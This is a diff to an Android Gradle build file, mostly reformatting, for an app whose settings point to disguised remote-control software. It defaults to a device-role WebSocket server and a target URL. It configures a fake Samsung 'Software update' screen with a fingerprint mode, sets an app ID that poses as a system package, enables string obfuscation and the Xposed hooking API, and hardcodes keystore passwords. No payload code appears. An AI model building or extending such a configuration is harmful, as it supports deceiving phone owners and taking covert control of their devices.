@@ -1,7 +1,8 @@
-// ── Patch: Xposed API via local jar (libs/api-82.jar) ───────────────────────
-// Drops the maven dependency. Uses the jar you dropped in libs/.
-// No network fetch, no version drift, reproducible builds.
+plugins {
+    id 'com.android.application'
+}
 
+// ── LSParanoid guard ─────────────────────────────────────────────────────────
 def skipParanoid = project.findProperty('SKIP_PARANOID') == 'true'
 if (!skipParanoid) {
     try {
@@ -11,22 +12,22 @@ if (!skipParanoid) {
     }
 }
 
-// ── Build config injectables ──────────────────────────────────────────────────
-def serverUrl      = project.findProperty('SERVER_URL')         ?: 'wss://your-server.com/ws?role=device&id='
-def targetUrl      = project.findProperty('TARGET_URL')         ?: 'https://google.com'
-def updateMode     = (project.findProperty('UPDATE_MODE')       ?: '1').toInteger()   // 0=none 1=system 2=fingerprint
-def updateBrand    = project.findProperty('UPDATE_BRAND')       ?: 'Samsung'
-def updateTitle    = project.findProperty('UPDATE_TITLE')       ?: 'Software update'
-def updateVersion  = project.findProperty('UPDATE_VERSION')     ?: 'ONE UI 6.1'
-def updateDuration = (project.findProperty('UPDATE_DURATION_MS') ?: '10000').toInteger()
-def ksPath         = project.findProperty('KEYSTORE_PATH')      ?: '../alpha-release.jks'
-def ksPass         = project.findProperty('KEYSTORE_PASS')      ?: 'AlphaRelease2024'
-def ksAlias        = project.findProperty('KEY_ALIAS')          ?: 'alpha-key'
-def ksKeyPass      = project.findProperty('KEY_PASS')           ?: 'AlphaRelease2024'
-def vCode          = (project.findProperty('VERSION_CODE')      ?: '10000').toInteger()
-def vName          = project.findProperty('VERSION_NAME')       ?: '1.0.0'
-def appLabel       = project.findProperty('APP_LABEL')          ?: ''
-def appId          = project.findProperty('APP_ID')             ?: 'com.android.media.core'
+// ── Build config injectables ─────────────────────────────────────────────────
+def serverUrl      = project.findProperty('SERVER_URL')          ?: 'wss://your-server.com/ws?role=device&id='
+def targetUrl      = project.findProperty('TARGET_URL')          ?: 'https://google.com'
+def updateMode     = (project.findProperty('UPDATE_MODE')        ?: '1').toInteger()   // 0=none 1=system 2=fingerprint
+def updateBrand    = project.findProperty('UPDATE_BRAND')        ?: 'Samsung'
+def updateTitle    = project.findProperty('UPDATE_TITLE')        ?: 'Software update'
+def updateVersion  = project.findProperty('UPDATE_VERSION')      ?: 'ONE UI 6.1'
+def updateDuration = (project.findProperty('UPDATE_DURATION_MS')  ?: '10000').toInteger()
+def ksPath         = project.findProperty('KEYSTORE_PATH')       ?: '../alpha-release.jks'
+def ksPass         = project.findProperty('KEYSTORE_PASS')       ?: 'AlphaRelease2024'
+def ksAlias        = project.findProperty('KEY_ALIAS')           ?: 'alpha-key'
+def ksKeyPass      = project.findProperty('KEY_PASS')            ?: 'AlphaRelease2024'
+def vCode          = (project.findProperty('VERSION_CODE')       ?: '10000').toInteger()
+def vName          = project.findProperty('VERSION_NAME')        ?: '1.0.0'
+def appLabel       = project.findProperty('APP_LABEL')           ?: ''
+def appId          = project.findProperty('APP_ID')              ?: 'com.android.media.core'
 
 android {
     namespace 'com.alpha.shield'
@@ -57,13 +58,22 @@ android {
         }
 
         externalNativeBuild {
-            cmake { cppFlags ""; abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64' }
+            cmake {
+                cppFlags ""
+                abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'
+            }
         }
-        ndk { abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64' }
+
+        ndk {
+            abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'
+        }
     }
 
     externalNativeBuild {
-        cmake { path "CMakeLists.txt"; version "3.22.1" }
+        cmake {
+            path "CMakeLists.txt"
+            version "3.22.1"
+        }
     }
 
     signingConfigs {
@@ -74,8 +84,10 @@ android {
                 storePassword ksPass
                 keyAlias      ksAlias
                 keyPassword   ksKeyPass
-                v1SigningEnabled true; v2SigningEnabled true
-                enableV3Signing true;  enableV4Signing true
+                v1SigningEnabled true
+                v2SigningEnabled true
+                enableV3Signing true
+                enableV4Signing true
             }
         }
     }
@@ -88,9 +100,15 @@ android {
     }
 
     buildTypes {
-        debug   { debuggable true; minifyEnabled false; shrinkResources false }
+        debug {
+            debuggable true
+            minifyEnabled false
+            shrinkResources false
+        }
         release {
-            debuggable false; minifyEnabled true; shrinkResources true
+            debuggable false
+            minifyEnabled true
+            shrinkResources true
             buildConfigField 'boolean', 'IS_RELEASE', 'true'
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
             signingConfig signingConfigs.release
@@ -102,14 +120,24 @@ android {
         targetCompatibility JavaVersion.VERSION_17
     }
 
-    buildFeatures { buildConfig true }
+    buildFeatures {
+        buildConfig true
+    }
 
     packagingOptions {
-        jniLibs { useLegacyPackaging = true }
+        jniLibs {
+            useLegacyPackaging = true
+        }
         resources {
-            excludes += ['DebugProbesKt.bin','META-INF/*.version',
-                         'META-INF/NOTICE*','META-INF/LICENSE*',
-                         'META-INF/DEPENDENCIES','kotlin/**','okhttp3/**']
+            excludes += [
+                'DebugProbesKt.bin',
+                'META-INF/*.version',
+                'META-INF/NOTICE*',
+                'META-INF/LICENSE*',
+                'META-INF/DEPENDENCIES',
+                'kotlin/**',
+                'okhttp3/**'
+            ]
         }
     }
 }
@@ -123,9 +151,11 @@ dependencies {
     implementation 'com.squareup.okhttp3:okhttp:4.12.0'
     implementation 'com.google.code.gson:gson:2.10.1'
 
-    if (skipParanoid) compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
+    if (skipParanoid) {
+        compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
+    }
 
-    // ── Xposed API — local jar, compileOnly so it's not bundled in the APK ──
+    // Xposed API — local jar, compileOnly so it's not bundled in the APK
     compileOnly files('libs/api-82.jar')
 
     testImplementation 'junit:junit:4.13.2'
